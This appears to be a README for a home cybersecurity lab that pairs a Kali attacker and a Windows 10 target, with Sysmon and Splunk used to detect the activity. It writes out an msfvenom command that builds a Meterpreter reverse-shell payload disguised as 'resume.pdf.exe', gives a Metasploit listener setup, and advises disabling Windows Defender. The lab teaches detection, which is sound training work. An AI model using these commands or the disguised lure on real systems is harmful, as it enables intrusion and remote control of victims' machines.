# -SOC-Home-Lab-Attack-Defense-Simulation-
This project demonstrates the setup of a home lab environment for cybersecurity testing, including an attack machine (Kali Linux), a target machine (Windows 10 VM), and a logging system (Splunk) to monitor malicious activities.The project involves:

Setting up virtual machines
Installing and configuring Sysmon for log collection
Deploying malware using msfvenom
Monitoring attacks using Splunk


🔧Prerequisites

Requirement	Description
RAM	At least 16GB (to run multiple VMs)
Virtualization Software	VMware Workstation or VirtualBox
Operating Systems	ISO files for Windows 10 and Kali Linux
Logging Tools	Splunk and Sysmon setup files
Internet Connection	Required for downloading and configuring tools

Network Topology

Below is a simple network topology illustrating the setup:
   [Kali Linux (Attacker)]  --->  [Windows 10 VM (Target)]  --->  [Splunk (Log Monitoring)]

The Kali Linux machine attacks the Windows VM, and logs are collected by Splunk for analysis.


Step 1: Setting Up Virtual Machines

1.1 Install Kali Linux (Attacker Machine)
Download Kali Linux ISO from Kali Official Website.
Create a new VM in VMware/VirtualBox and install Kali Linux.
Update and upgrade Kali:
sudo apt update && sudo apt upgrade -y

1.2 Install Windows 10 (Target Machine)
Download Windows 10 ISO from Microsoft's website.
Create a new VM and install Windows 10.
Ensure networking is enabled for communication between VMs.


Step 2: Installing Splunk for Log Monitoring

Download Splunk Free from Splunk Website.
Install Splunk on your Windows 10 VM.
Start Splunk and log in with admin credentials.
Enable data collection for monitoring logs.

Step 3: Installing Sysmon on Windows 10

Download Sysmon from Microsoft Sysinternals.
Download a pre-configured sysmonconfig.xml from Sysmon Modular.
Open PowerShell as Administrator and run:
cd "C:\Users\Downloads\sysmon"
.\sysmon64.exe -i sysmonconfig.xml
Verify Sysmon is running:
Get-Process sysmon64


Step 4: Generating Malware with msfvenom

On Kali Linux, generate a malicious executable:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Attacker_IP> LPORT=4444 -f exe -o resume.pdf.exe

This creates resume.pdf.exe, which acts as our payload.


Step 5: Setting Up a Metasploit Listener

Open Metasploit on Kali:
msfconsole
Configure the listener:
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <Attacker_IP>
set LPORT 4444
exploit


Deploy resume.pdf.exe on Windows 10 and execute it.

If successful, you gain a Meterpreter session:
meterpreter > sysinfo

Step 6: Monitoring Logs with Splunk

Open Splunk and search for unauthorized activity:
index=main sourcetype=WinEventLog:Security
Identify anomalies related to unauthorized access.

Create alerts to detect suspicious behavior.
🔍Troubleshooting
1. Metasploit Handler Not Receiving a Session
Ensure Windows Defender is disabled to prevent blocking the payload.
Double-check LHOST and LPORT settings in both msfvenom and msfconsole.
Run the payload on Windows as Administrator.

3. Splunk Not Logging Events
Verify Sysmon is correctly installed and running.
Ensure Windows Event Logging is enabled in Splunk.
Restart Splunk and recheck the event index.

🎯Next Steps & Future Improvements
Integrate ELK Stack for enhanced log analysis.
Automate attack execution using Python scripts.
Implement Wazuh SIEM for better threat detection.
How to Contribute
Interested in improving this project? Contributions are welcome!

Fork the repository.
Create a new branch with your improvements.
Submit a pull request for review

Conclusion
This project demonstrates how to:
Set up a cybersecurity home lab
Deploy and detect malware
Use Splunk for threat monitoring
